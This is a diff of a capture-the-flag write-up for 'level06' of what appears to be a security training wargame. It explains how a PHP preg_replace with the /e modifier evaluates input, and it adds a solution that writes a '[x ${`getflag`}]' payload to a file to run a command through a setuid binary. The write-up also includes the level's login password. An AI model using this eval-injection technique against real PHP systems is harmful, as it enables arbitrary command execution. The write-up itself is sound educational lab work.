@@ -456,9 +456,14 @@ Login
 ```b
 > ssh level06@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: viuaaale9huek52boumoomioc
+> ls -l
+-rwsr-x---+ 1 flag06 level06 7503 level06
+-rwxr-x---  1 flag06 level06  356 level06.php
 ```
 
-Inspect (there are 2 files)
+There are 2 files.
+
+Inspect:
 
 ```b
 > file level06
@@ -504,7 +509,7 @@ function y($m) {
 }
 ```
 
-Notes - function y filters m twice
+Function `y` filters m twice
 1. `" x "` replaces all regex `/./`
 2. `" y"` replaces all regex `/@/`
 
@@ -520,7 +525,7 @@ function x($y, $z) {
 }
 ```
 
-Notes - function x filters `argv[1]`
+Function `x` filters `argv[1]`
 1. `"/(\[x (.*)\])/e"`
     - matches `[x `_cap_`]` and insert 2nd captured group to string `y("`_cap_`")` 
     - `/e` will eval the `y(\"\\2\")` as PHP code 
@@ -529,13 +534,24 @@ Notes - function x filters `argv[1]`
 2. `(` and `)` replace all `[` and `]` in the result respectively
 - the func disregards argv[2]
 
-Solution
-- figure one way
-  - ```[x ${`getflag`}]```
-  - `${`getflag`}` captured
-  - ````getflag```` the backticks = doing `shell_exec()`
-  - `${ret}`
+Our goal
+- `file_get_contents($argv[1])` depends on ___content___ of the file 
+- so `argv[1]` to  a FILE 
+- it should be oneline in form of `[x `_cap_`]`
 
+Solution
+
+```b
+# get the _token/flag_ in there to be captured and printed out
+  # shell_exec() system() exec() or simply backticks
+# `getflag` called
+# ${`getflag`} - get the ret
+# [x ${`getflag`}] - framed in this form
+# echo $(oneliner) > /tmp/temp - push it to a FILE
+
+> echo '[x ${`getflag`}]' > /tmp/temp
+> ./level06 /tmp/temp
+```
 
 
 # 07 - Todo
